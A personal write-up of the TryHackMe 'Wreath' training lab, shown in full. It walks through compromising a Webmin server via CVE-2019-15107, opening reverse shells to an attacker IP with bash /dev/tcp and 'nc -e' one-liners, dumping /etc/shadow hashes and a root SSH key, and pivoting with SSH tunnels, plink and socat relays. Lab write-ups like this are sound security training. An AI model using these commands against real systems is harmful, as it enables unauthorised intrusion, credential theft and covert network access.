# Wreath

Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Streak limitation only for non-subscribed users)

https://tryhackme.com/room/wreath

## 1. Background

<details>
  <summary>---</summary>

> *There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*

- 3 machines on the network
- At least one public facing webserver
- Self hosted git server on the network
- git server is internal. There may be sensitive information to find
- PC on the network with AV installed - likely Windows
- Windows PC cannot be directly access from the webserver 

</details>

## 2. Webserver enumeration

<details>
  <summary>---</summary>

![Network map](./wreath-network.png)

### Initial scan

Start with nmap

We find there are 4 ports open

```
nmap -p-15000 10.200.81.200 -oN initial.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-05 02:14 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).
Not shown: 14995 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
443/tcp   open   https
9090/tcp  closed zeus-admin
10000/tcp open   snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 118.64 seconds
```

### Server OS

Find out what OS is running on the webserver - `centos`

```
nmap -p 80 -sV 10.200.81.200 -oN port80.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 02:00 EDT
Nmap scan report for 10.200.81.200
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
```

### Check out the web page

Opening `10.200.81.200` on a web browser redirects to `https://thomaswreath.thm/`

![Failed to resolve](./failed-resolve.png)

Fix this by editing `/etc/hosts` for Linux/Mac or `C:\Windows\System32\drivers\etc\hosts` on Windows.

`/etc/hosts` file
```
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.200.81.200   thomaswreath.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

With DNS resolving properly, we can now access the webserver and see if we can find any interesting information

We can see interesting info such as 
- Home address
- Home and mobile numbers `+447821548812 `
- Email address


### Check out port 10000 service

nmap scan reveals server version `MiniServ 1.890 (Webmin httpd)`
```
nmap -p 10000 -sV 10.200.81.200 -oN port10000.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 04:48 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.69 seconds
```

Vuln scan
```
nmap -p 10000 --script vuln 10.200.81.200 -oN port10000vuln.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 04:51 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).

PORT      STATE SERVICE
10000/tcp open  snet-sensor-mgmt
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.exploit-db.com/exploits/1997/
|_sslv2-drown: 

Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
```

Quick Google search reveals this server version is vulnerable to `CVE-2019–15107`

</details>

## 3. Webserver Exploitation

<details>
  <summary>---</summary>

Exploit can be downloaded and run from `https://github.com/MuirlandOracle/CVE-2019-15107`

pip is required to install dependencies `cd CVE-2019-15107 && pip3 install -r requirements.txt`

```
./CVE-2019-15107.py 10.200.81.200

        __        __   _               _         ____   ____ _____     
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|    
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|      
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___     
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|     
                                                                       
                                                @MuirlandOracle        
                                                                       
                                                                       
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.81.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                     
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id                                                                   
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

```

This is just a pseudo shell. Create a reverse shell by:

1. New terminal start a nc listener

```
nc -lvnp 1337
```

2. On the pseudo shell run a reverse bash command
   
```
/bin/bash -i >& /dev/tcp/10.50.82.56/1337 0>&1 
```

If `nc` is available you can run this

```
nc -e /bin/sh 10.50.82.56 1337 
```

3. Back on the listener terminal, we have reverse shell

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 45242          
bash: cannot set terminal process group (1781): Inappropriate ioctl for device
bash: no job control in this shell                                     
[root@prod-serv ]# id                                                  
id                                                                     
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
```

### Stabilise the shell

1. Spawn PTY with python

```
[root@prod-serv ]# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
[root@prod-serv ]# 
```

2. Background the shell with `CTRL Z`. Then examine current terminal and STTY info

```
[root@prod-serv ]# ^Z
[1]+  Stopped                 nc -lvnp 1337
kali@kali:~$ echo $TERM
xterm-256color

kali@kali:~$ stty -a
speed 38400 baud; rows 54; columns 185; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;
discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

```
> This reveals term type: `xterm-256color` and the size of current TTY: `rows 54; columns 185`

while the shell is in the background, run `stty raw -echo` then `fg` and `export TERM=xterm`

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 45248
bash: cannot set terminal process group (1781): Inappropriate ioctl for device
bash: no job control in this shell
[root@prod-serv ]# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
[root@prod-serv ]# ^Z
[1]+  Stopped                 nc -lvnp 1337
kali@kali:~$ stty raw -echo
kali@kali:~$ nc -lvnp 1337
                          export TERM=xterm
[root@prod-serv ]# 
```

> Note `nc -lvnp 1337` was not typed. It was `fg` but not echoed back

The shell is now stabilised

Summary:
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `CTRL Z`
3. `stty raw -echo`
4. `fg`
5. `export TERM=xterm`

### Dump password hash

```
cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18573::::::
systemd-coredump:!!:18573::::::
systemd-resolve:!!:18573::::::
tss:!!:18573::::::
polkitd:!!:18573::::::
libstoragemgmt:!!:18573::::::
cockpit-ws:!!:18573::::::
cockpit-wsinstance:!!:18573::::::
sssd:!!:18573::::::
sshd:!!:18573::::::
chrony:!!:18573::::::
rngd:!!:18573::::::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
unbound:!!:18573::::::
apache:!!:18573::::::                                                                                                                                                                    
nginx:!!:18573::::::                                                                                                                                                                     
mysql:!!:18573:::::: 
```

### Find interesting access keys

SSH keys are commonly stored in the home directory under `~/.ssh`

```
ls -la ~/.ssh
total 16
drwx------. 2 root root   80 Jan  6 03:29 .
dr-xr-x---. 3 root root  228 Apr  4 10:20 ..
-rw-r--r--. 1 root root  571 Nov  7 14:05 authorized_keys
-rw-------. 1 root root 2602 Nov  7 14:02 id_rsa
-rw-r--r--. 1 root root  571 Nov  7 14:02 id_rsa.pub
-rw-r--r--. 1 root root  345 Apr  3 07:54 known_hosts
```

Since we are root, we have read access to the private key `id_rsa`. Save the key locally

```
cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs0oHYlnFUHTlbuhePTNoITku4OBH8OxzRN8O3tMrpHqNH3LHaQRE
LgAe9qk9dvQA7pJb9V6vfLc+Vm6XLC1JY9Ljou89Cd4AcTJ9OruYZXTDnX0hW1vO5Do1bS
...
YlXRN11U6IKYQMTQgXDcZxTx+KFp8WlHV9NE2g3tHwagVTgIzmNA7EPdENzuxsXFwFH9TY
EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by
GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg==
-----END OPENSSH PRIVATE KEY-----
```

Copy it to local machine and change file permission to suit SSH standards

```
kali@kali:~/thm/wreath/.ssh$ chmod 600 id_rsa 
kali@kali:~/thm/wreath/.ssh$ ls -la
total 12
drwxr-xr-x 2 kali kali 4096 Apr  4 05:30 .
drwxr-xr-x 4 kali kali 4096 Apr  4 05:30 ..
-rw------- 1 kali kali 2602 Apr  4 05:30 id_rsa
```

> Note: if you dont change the permission of the key, you wont be able to use it

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
root@10.200.81.200: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

Now we can just use this key to ssh straight into the webserver

```
ssh -i id_rsa root@10.200.81.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

</details>

## 4. Pivoting

<details>
  <summary>---</summary>

### Definition

Pivoting is using access obtained over one machine to exploit another machine deeper in the network.

The technique involves gaining initial access to a remote network, and use it to access other machines

![pivoting](pivoting.png)

Above there are four machines on the target network
- 1 public facing server
- 3 machines not exposed to the internet

By accessing the public server, it is then possible to pivot to attack the other 3 targets.

### Methods

Methods varies depending on OS

Two main methods:

1. Tunnelling/Proxying

Creating proxy connection through compromised machine. 
This could be tunnelled inside another protocol (eg. SSH tunnelling) which is useful in evading basic intrusion detection system or firewall

Proxying is preferred when there is need to redirect lots of different kinds of traffic to target network eg. nmap scan or access multiple ports on multiple different machines

2. Port forwarding

Creating a connection between local port and single port on a target via compromised host

Port forwarding tends to be faster and more reliable but only allow access to a single port (or small range) on a target device

Example pivoting tools

- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)
- chisel (Windows and Unix)
- sshuttle (currently Unix only)

</details>

## 5. Pivoting Enumeration

<details>
  <summary>---</summary>

### Enumerate compromised host

In order of preferences

1. Using materials found on the machine eg. ARP cache, hosts file, DNS server
2. Using pre-installed tools
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through proxy

Local tools can be slow and should be last resort

### Checking arp cache

ARP cache can be found on Windows or Linux. This will show any IP addresses of hosts that target has interacted with recently

```
arp -a
```

### Check static mapping

Found in `/etc/hosts` or `C:\Windows\System32\drivers\etc\hosts` 

Linux local DNS found in `/etc/resolv.conf` or `nmcli dev show` - can be misconfigured to allow DNS zone transfer attack
Windows DNS server can be checked with `ipconfig /all`

### Check if nmap installed

If no nmap write a script 

ICMP ping scan 
```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

Port scanning - takes a long time however
```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

### Example static binaries

These binaries can be uploaded to the compromised machine to run. See Pivoting - Socat for more instructions

[socat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
[other binaries](https://github.com/andrew-d/static-binaries)

</details>

## 6. Proxychains and FoxyProxy

<details>
  <summary>---</summary>

### Proxychains

Prepend other commands. Proxychains uses config file in `./proxychains.conf`, `~/.proxychains/proxychains.conf`, or `/etc/proxychains.conf` 

```
proxychains nc 172.16.0.10 23
```

Multiple servers can be used to chain all proxies together
in `proxychains.conf`
```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

Comment out `proxy_dns` line when doing nmap scans through proxy chains as this can cause the scan to hang

```
# Proxy DNS requests -no leak for DNS data
# proxy_dns
```

Other things to note
- Only TCP scans - no UDP or SYN scans
- ICMP echo packets (ping) will not work, use -Pn to prevent nmap
- It will be slow. Try only use nmap through a proxy when using the NSE (use static binary to see open ports/hosts before proxying a local copy of nmap to use the scripts library)

### FoxyProxy

Better with web browser. Popular with Burp and ZAP

## Pivoting SSH Tunnelling / Port Forwarding

### Forward connections

Creating a forward (local) SSH tunnel done on attacking box when we have SSH access to the target. Two ways: `port forwarding` or `creating a proxy`

1. Port Forwarding

`-L` : enables port forwarding. Link to local port
`-f` : backgrounds terminal immediately
`-N` : tells SSH theres no commands to be executed only set connection

Eg.
- We have access to SSH 172.16.0.5
- Web server on 172.16.0.10
- `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
- This means we can access webserver `172.16.0.10` by visiting `localhost:8000` on a web browser through SSH tunnel from `172.16.0.5`

2. Creating a proxy

`-D [port]` : open up a port on attacking box as a proxy to send data to protected network. Useful when combined with proxychains

eg.
`ssh -D 1337 user@172.16.0.5 -fN`

### Reverse connections

Preferable if you have shell on server but not SSH access.
This is however riskier as you must access your attacking machine from the target by credentials or better yet key based system

1. Generate ssh keys `ssh-keygen`

```
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./reverse
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./reverse
Your public key has been saved in ./reverse.pub
The key fingerprint is:
SHA256:DmgoQJUIMyG6qW2F8zRMWQgFR/BfW37m2+MWYGttQNk kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|Bo*B=..      o   |
|++ +.o      o E  |
|o   +   . ..     |
|.o = o . +  +    |
|+ + B o S ..o=   |
|.o * . o   +o +  |
|. o .   .  ... . |
| .           oo  |
|            .oo. |
+----[SHA256]-----+
```

2. Copy public key (`.pub` file) then edit `~/.ssh/authorized_keys`
3. New line: `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` then paste the public key. This is to ensure the key only used for port forwarding. Stopping ability to gain a shell on attacking machine
4. Check if SSH server running `sudo systemctl status ssh
```
sudo systemctl status ssh
[sudo] password for kali: 
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
       Docs: man:sshd(8)
             man:sshd_config(5)
```

SSH service can be started with
```
sudo systemctl start ssh
```

5. Lastly transfer the private key to the target box. This is usually an absolute no-no. This is why we generate a throwaway set of SSH keys to be discarded as soon as the engagement is over
6. We can finally connect back with a reverse prot forwarding using

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

For the web server 172.16.0.10 and 172.16.0.5 shell'd server. With attacking box 172.16.0.20

```
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

On newer client the reverse proxy creation can be done with `-D`

```
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

To kill any connections use `ps aux | grep ssh` then `sudo kill PID`

</details>

## 7. Pivoting - plink.exe

<details>
  <summary>---</summary>

Plink.exe is a windows command line version of PuTTY SSH client. This was created before Windows had its own inbuilt SSH client.

Windows servers are unlikely to have an SSH server running so the use of plink is to transport binary to the target, then using it to create a reverse connection

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

`cmd.exe /c echo y` : non-interactive shells to get around warning message for never previously connected host

If we have access to 172.16.0.5 and forwarding connection to 172.16.0.10:80 back to port 8000 on the attacking machine 172.16.0.20

```
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

Keys generated by `ssh-keygen` wont work here however. It will need to be converted by `puttygen` tool, installed by `sudo apt install putty-tools` then run `puttygen KEYFILE -o OUTPUT_KEY.ppk`. 

The .ppk file then can be transferred to Windows and used the same way as reverse port forwarding

plink is preinstalled on Kali at `/usr/share/windows-resources/binaries/plink.exe` but should be updated before engagement from https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

</details>

## 8. Pivoting - Socat

<details>
  <summary>---</summary>

Socat:
- Great for fully stable Linux shells
- Port forwarding.
- However, rarely installed on target
- Unlikely to bypass AV in Windows
- Makes a good relay

For example: trying to get shell on a target without direct connection. Use socat to set up a relay on the compromised machine. This listens for the reverse shell from target and forwards to attacking box

![socat as a relay](socat.png)

Above we create a port forward from a port on the compromised server to a listening port on our attacker box. The other way is also possible: either forwarding a connection from attacking machine to a target inside network; or creat a direct link between listening port on attacking machine with service on the internal server. The latter is useful as it does not require opening a port to compromised server.

To download binary for socat:

1. Set up python web server on attacking machine (in the directory with socat binary)

```
sudo python3 -m http.server 80
```

2. Download on target machine with curl

```
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```

Example

Attacking machine
```
kali@kali:~/thm/wreath$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.81.200 - - [05/Apr/2021 02:40:22] "GET /socat-Neozer0 HTTP/1.1" 200 -
10.200.81.200 - - [05/Apr/2021 02:41:13] "GET /nc-Neozer0 HTTP/1.1" 200 -

```

Compromised webserver
```
root@prod-serv tmp]# curl 10.50.82.56/socat -o /tmp/socat-Neozer0 && chmod +x /tmp/socat-Neozer0
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  369k  100  369k    0     0   224k      0  0:00:01  0:00:01 --:--:--  224k

[root@prod-serv tmp]# ls -la socat-N*
-rwxr-xr-x. 1 root root 378384 Apr  5 05:08 socat-Neozer0
```

### Reverse shell relay

Start a listener in attacking machine
```
kali@kali:~/thm/wreath$ sudo nc -lvnp 443
listening on [any] 443 ...

```

run socat on compromised webserver
```
[root@prod-serv tmp]# ./socat-Neozer0 tcp-l:8000 tcp:10.50.82.56:443 &
[1] 2136
```

`tcp-l:8000` : create first half of the connection - an IPv4 listener on tcp port 8000 of target machine
`tcp:ATTACKING_IP_443` : connects back to our local IP on port 443
`&` : backgrounds the listener while we can still use the shell for other commands

Create reverse shell on newly opened port 8000

```
chmod +x ./nc-Neozer0

./nc-Neozer0 127.0.0.1 8000 -e /bin/bash

```

Back on attacking machine we have a reverse shell

```
sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 41630
whoami
root
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:9b:ca:22:d5:ab brd ff:ff:ff:ff:ff:ff
    inet 10.200.81.200/24 brd 10.200.81.255 scope global dynamic noprefixroute eth0
       valid_lft 2072sec preferred_lft 2072sec
    inet6 fe80::9b:caff:fe22:d5ab/64 scope link 
       valid_lft forever preferred_lft forever
```

### Port forwarding -- easy

The quick and easy way is to open up a listening port on compromised server and redirect whatever traffic it receives to target server

For example, compromise server 172.16.0.5 and target port 3306 of 172.16.0.10 then we could run `./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`. This opens port 33060 on compromised server and redirects input from attacking machine straight to target server 172.16.0.10 port 3306 (MySQL database)

`fork` : put every connection into new process
`reuseaddr` : port stays open after connection is made
`&` : backgrounds the shell, keep using same terminal session

Above options combined allow us to use the same port forward for more than one connection.

We can now connect to port 33060 on the relay 172.16.0.5 and connection directly relayed to our target 172.16.0.10:3306

TODO: [port forwarding easy diagram]

### Port forwarding -- quiet

If we want to avoid opening a port and potentially alert any host/network scanning, we can use a quieter method of port forwarding with socat. This is slightly more complex.

1. Open up two port listeners on the attacking machine

Attacking machine
```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

This opens up two ports 8000 and 8001, creating port relay

2. Start a relay on compromised server

Compromised relay server
```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This makes connection between our listening 8001 on attacking machine and open port on target server

For example, 

```
./socat tcp:10.50.73.2:8001 tcp:172.16.0/10:80,fork &
```

This creates a link between port 8000 on attacking machine and port 80 on intended target 172.16.0.10. If we go to localhost:8000 on our attacking machine's web browser, it would load the webpage served by target 172.16.0.10:80.

Summary visiting webpage on attacking server:
- Request goes to 127.0.0.1:8000
- Socat listenner, anything goes into port 8000, comeso ut of port 8001
- Port 8001 is connected directly to socat porcess on the compromised server. Anything coming out of port 8001 gets sent to compromised server and relayed to port 80 on target server

Summary target sends response:
- Response sent to socat process on compromised server. What goes in process comes out to port 8001 on our attacking machine
- Anything goes in port 8001 on attacking machine comes out of port 8000 which is where web browser expects to receive its response

TODO: [port forwarding quiet diagram]

### Killing backgrounded socat port forwards

`jobs` : run command to see socat processes
`kill %NUMBER` : kill socat process

```
kali@kali:~$ socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
[1] 6453
kali@kali:~$ jobs
[1]+  Running                 socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
kali@kali:~$ kill %1
kali@kali:~$ jobs
[1]+  Exit 143                socat tcp-l:8001 tcp-l:8000,fork,reuseaddr
```

</details>

## 9. Pivoting - Chisel

<details>
  <summary>---</summary>


</details>
